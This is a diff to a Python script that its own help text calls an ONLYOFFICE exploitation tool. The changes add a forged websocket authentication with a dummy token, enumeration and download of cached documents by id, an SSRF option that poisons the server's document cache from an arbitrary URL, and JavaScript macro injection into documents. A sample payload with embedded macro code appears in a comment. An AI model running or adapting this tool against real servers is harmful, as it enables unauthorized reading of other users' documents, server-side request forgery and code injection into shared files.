@@ -5,6 +5,32 @@ import argparse, sys, re, time, signal, requests, uuid, json, tempfile, os, subp
 from urllib.parse import urlparse
 import concurrent.futures
 
+def process_fileparts( txt ):
+  txt = txt.replace(r'\"','"')[3:-2]
+  data = json.loads(txt)
+  print(data)
+  tmpdir = tempfile.mkdtemp()
+  for fn, url in data['data']['data'].items():
+    dest = os.path.join( tmpdir, fn )
+    d = os.path.dirname(dest)
+    if not os.path.isdir(d):
+      print('Creating ' + d)
+      os.makedirs(d)
+    print('Downloading ' + fn )
+    r = requests.get( url, stream=True )
+    print('Writing to '+dest,end='')
+    with open( dest, 'wb' ) as f:
+      for chunk in r:
+        print('.',end='')
+        f.write(chunk)
+    print(' done')
+  print( 'finished downloads')
+  infile = os.path.join(tmpdir,'Editor.bin')
+  outfile = os.path.join(tmpdir,'document.docx')
+  print('Attempting to convert ',infile,'to',outfile)
+  subprocess.check_output(['x2t/x2t',infile,outfile])
+  subprocess.check_output(['open',outfile])
+
 class WsClient():
 
   def __init__( self, url, docid, platform ):
@@ -23,6 +49,8 @@ class WsClient():
 
     print( self.url )
     self.ws = websocket.create_connection( self.url )
+    print( self.recv() )
+    print( self.recv() )
 
   def send( self, message ):
     if type( message ) != str:
@@ -34,6 +62,23 @@ class WsClient():
   def recv( self ):
     return self.ws.recv()
 
+
+  def auth( self, docurl='' ):
+    txt = r'["{\"type\":\"auth\",\"docid\":\"'+self.docid+r'\",\"token\":\"a\",\"user\":{\"id\":\"a\",\"username\":\"a\",\"firstname\":null,\"lastname\":null,\"indexUser\":-1},\"editorType\":0,\"lastOtherSaveTime\":-1,\"block\":[],\"sessionId\":null,\"sessionTimeConnect\":null,\"sessionTimeIdle\":0,\"documentFormatSave\":65,\"view\":false,\"isCloseCoAuthoring\":false,\"openCmd\":{\"c\":\"open\",\"id\":\"'+self.docid+r'\",\"userid\":\"a\",\"format\":\"docx\",\"url\":\"'+docurl+r'\",\"title\":\"whatever.docx\",\"lcid\":2057,\"nobase64\":false},\"lang\":null,\"mode\":null,\"permissions\":{\"edit\":true},\"IsAnonymousUser\":false}"]'
+    self.send( txt )
+    print( self.recv() )
+    count = 1
+    while count < 3:
+      # print( 'Count:', count )
+      result = self.recv()
+      print("Received '%s'" % result)
+      if 'Editor.bin' in result:
+        print( 'Found docid:', self.docid )
+        process_fileparts(result)
+        break;
+      count += 1
+    
+
   def save_changes( self, changes ):
     # ["{\"type\":\"saveChanges\",\"changes\":\"[\\\"78;AgAAADEA//8BAH7tVXlc7AEARwEAAAEAAAACAAAAAgAAAAIAAAAEAAAABAAAABwAAAA2AC4ANAAuADEALgA0ADUALgBAAEAAUgBlAHYA\\\",\\\"670;HgAAAF8AbQBhAGMAcgBvAHMARwBsAG8AYgBhAGwASQBkAAEAAAAAAAAANgEAAHsAIgBtAGEAYwByAG8AcwBBAHIAcgBhAHkAIgA6AFsAewAiAG4AYQBtAGUAIgA6ACIATQBhAGMAcgBvAHMAIAAxACIALAAiAHYAYQBsAHUAZQAiADoAIgAoAGYAdQBuAGMAdABpAG8AbgAoACkAXABuAHsAXABuACAAIAAgACAAYQBsAGUAcgB0ACgAMgApADsAXABuAH0AKQAoACkAOwAiACwAIgBnAHUAaQBkACIAOgAiADgANQBiADUAMwA5AGEANABjADkANAAxADQAOAAzAGIAOAAxADYANgA5ADAAYgBiAGUAOAA0ADAANAA1AGYAZAAiACwAIgBhAHUAdABvAHMAdABhAHIAdAAiADoAdAByAHUAZQB9AF0ALAAiAGMAdQByAHIAZQBuAHQAIgA6ADAAfQA2AQAAewAiAG0AYQBjAHIAbwBzAEEAcgByAGEAeQAiADoAWwB7ACIAbgBhAG0AZQAiADoAIgBNAGEAYwByAG8AcwAgADEAIgAsACIAdgBhAGwAdQBlACIAOgAiACgAZgB1AG4AYwB0AGkAbwBuACgAKQBcAG4AewBcAG4AIAAgACAAIABhAGwAZQByAHQAKAAxACkAOwBcAG4AfQApACgAKQA7ACIALAAiAGcAdQBpAGQAIgA6ACIAOAA1AGIANQAzADkAYQA0AGMAOQA0ADEANAA4ADMAYgA4ADEANgA2ADkAMABiAGIAZQA4ADQAMAA0ADUAZgBkACIALAAiAGEAdQB0AG8AcwB0AGEAcgB0ACIAOgB0AHIAdQBlAH0AXQAsACIAYwB1AHIAcgBlAG4AdAAiADoAMAB9AA==\\\"]\",\"startSaveChanges\":true,\"endSaveChanges\":true,\"isCoAuthoring\":false,\"isExcel\":false,\"deleteIndex\":18,\"excelAdditionalInfo\":\"{\\\"lm\\\":\\\"oc9gn4ob06oo_admin2\\\",\\\"SYg\\\":\\\"oc9gn4ob06oo_admin\\\",\\\"wTg\\\":\\\"14;BgAAADgAMQA0AAAAAAA=\\\"}\",\"unlock\":false,\"releaseLocks\":false}"]
     message = {
@@ -42,7 +87,15 @@ class WsClient():
       'endSaveChanges':True,
       'isCoAuthoring':False,
       'isExcel':False,
-      'changes':json.dumps(changes)
+      'changes':json.dumps(changes),
+      'deleteIndex': 1,
+      'excelAdditionalInfo':json.dumps({
+        'lm':'admin',
+        'SYg':'admin',
+        'wTg':'14;BgAAADgAMQA0AAAAAAA='
+      }),
+      'unlock':False,
+      'releaseLocks':False
     }
     self.send( message )
     while True:
@@ -70,8 +123,11 @@ def main():
   parser = argparse.ArgumentParser(description="ONLYOFFICE exploitation tool")
   parser.add_argument('-u', '--url', help='Base URL of the site running ONLYOFFICE')
   parser.add_argument('-d', '--docid', help='id of the document')
+  parser.add_argument('-D', '--docurl', help='Document URL to download to OO cache for the current docid (SSRF, unix: pipes supported)', default='')
   parser.add_argument('-p', '--platform', default='nextcloud', help='What the underlying platform is')
   subparsers = parser.add_subparsers(dest='command')
+
+  # TODO: Start a separate thread to handle received websocket messages
 
   # Download
   dlparse = subparsers.add_parser('dl')
@@ -80,22 +136,38 @@ def main():
   injparse = subparsers.add_parser('macro')
   injparse.add_argument('script', help='Javascript file to inject into document')
 
+  # Enumerate cached doc ids
+  enumparse = subparsers.add_parser('enum')
+  enumparse.add_argument('docids', help='text file containing doc ids to test')
+
   args = parser.parse_args()
 
-  if not args.url or not args.docid or not args.command:
-    parser.print_usage()
+  if not args.command or not args.url or ( args.command != 'enum' and not args.docid ) or ( args.command == 'enum' and not args.docids ):
+    parser.print_help()
     sys.exit(2)
+
+  # Document enumeration
+  if args.command == 'enum':
+    with open( args.docids, 'r' ) as f:
+      for line in f.readline():
+        docid = line.strip()
+        client = WsClient( args.url, docid, args.platform )
+        client.auth()
+    sys.exit(0)
 
   client = WsClient( args.url, args.docid, args.platform )
 
-# Poison document cache with external URL
-# SSRF
-# Macro injection
+  # Macro injection
   if args.command == 'macro':
     with open(args.script, 'r') as f:
+      client.auth()
       client.inject_macro(f.read())
 
-# Document enumeration
+  # Poison document cache with external URL
+  # SSRF
+  if args.command == 'dl':
+    client.auth( args.docurl )
+
 
 
 
